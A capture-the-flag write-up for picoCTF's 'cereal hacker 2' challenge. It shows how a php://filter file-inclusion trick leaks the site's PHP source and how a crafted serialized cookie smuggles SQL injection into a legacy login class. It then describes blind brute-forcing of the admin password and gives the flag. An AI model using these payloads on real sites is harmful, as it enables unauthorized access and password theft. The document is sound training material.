# cereal hacker 2 - Points: 500

1. First, lets go through the website : https://2019shell1.picoctf.com/problem/62195/
2. Then, we could find out that it is as same as "cereal hacker 1", so I try the weak password again and find that I failed.
3. Now, lets try https://2019shell1.picoctf.com/problem/62195/index.php?file=admin and find there is nothing.
4. Next, I tried to grab its source code by https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=admin and decode it by base64 : 
    ```
    <?php

    require_once('cookie.php');

    if(isset($perm) && $perm->is_admin()){
    ?>

        <body>
            <div class="container">
                <div class="row">
                    <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                        <div class="card card-signin my-5">
                            <div class="card-body">
                                <h5 class="card-title text-center">Welcome to the admin page!</h5>
                                <h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </body>

    <?php
    }
    else{
    ?>

        <body>
            <div class="container">
                <div class="row">
                    <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
                        <div class="card card-signin my-5">
                            <div class="card-body">
                                <h5 class="card-title text-center">You are not admin!</h5>
                                <form action="index.php" method="get">
                                    <button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </body>

    <?php
    }
    ?>
    ```
    https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=index
    ```
    <?php

    if(isset($_GET['file'])){
        $file = $_GET['file'];
    }
    else{
        header('location: index.php?file=login');
        die();
    }

    if(realpath($file)){
        die();
    }
    else{
        include('head.php');
        if(!include($file.'.php')){
            echo 'Unable to locate '.$file.'.php';
        }
        include('foot.php');
    }

    ?>

    ```
    https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=cookie
    ```
        <?php

        require_once('../sql_connect.php');

        // I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
        class permissions
        {
            public $username;
            public $password;

            function __construct($u, $p){
                $this->username = $u;
                $this->password = $p;
            }

            function is_admin(){
                global $sql_conn;
                if($sql_conn->connect_errno){
                    die('Could not connect');
                }
                //$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';

                if (!($prepared = $sql_conn->prepare("SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;"))) {
                    die("SQL error");
                }

                $prepared->bind_param('ss', $this->username, $this->password);

                if (!$prepared->execute()) {
                    die("SQL error");
                }

                if (!($result = $prepared->get_result())) {
                    die("SQL error");
                }

                $r = $result->fetch_all();
                if($result->num_rows !== 1){
                    $is_admin_val = 0;
                }
                else{
                    $is_admin_val = (int)$r[0][0];
                }

                $sql_conn->close();
                return $is_admin_val;
            }
        }

        /* legacy login */
        class siteuser
        {
            public $username;
            public $password;

            function __construct($u, $p){
                $this->username = $u;
                $this->password = $p;
            }

            function is_admin(){
                global $sql_conn;
                if($sql_conn->connect_errno){
                    die('Could not connect');
                }
                $q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';

                $result = $sql_conn->query($q);
                if($result->num_rows != 1){
                    $is_user_val = 0;
                }
                else{
                    $is_user_val = 1;
                }

                $sql_conn->close();
                return $is_user_val;
            }
        }


        if(isset($_COOKIE['user_info'])){
            try{
                $perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
            }
            catch(Exception $except){
                die('Deserialization error.');
            }
        }

        ?>

    ```
5. After reading these source code, we can find out an interesting different then "cereal hacker 1". The "right" object of login is "siteuser" rather than "permissions", so the payload must be : 
    ```
    O:8:"siteuser":2:{s:8:"username";s:16:"admin' and 1=1 #";s:8:"password";s:1:"1";}
    ```
    Then, encode by base64 and create a cookie named "user_info". We would get an information with flag : "Find the admin's password!", so we could know that the flag is the admin's password.
6. Now, how could we take the password? I find out a way : sql injection boolean-based blind attack. This allow us to check the password one by one, so the main problem is how we reach the goal? Here is the resource : https://sqlzoo.net/hack/16password.htm Then, I figure out a payload : 
    ```
    O:8:"siteuser":2:{s:8:"username";s:5:"admin";s:8:"password";s:33:"123' or password like binary 'a%";}
    ```
    The payload "123' or password like binary 'a%" means if the password isn't 123 or the password's first keyword is 'a' then it will pass. "binary" means should distinguish the difference between upper and lower. 
7. As you can see, we have to brute attack the password one by one using python. If we success and the feed back will be "Welcome". After tones of time, we could get the flag. 
8. Here is the flag : picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}
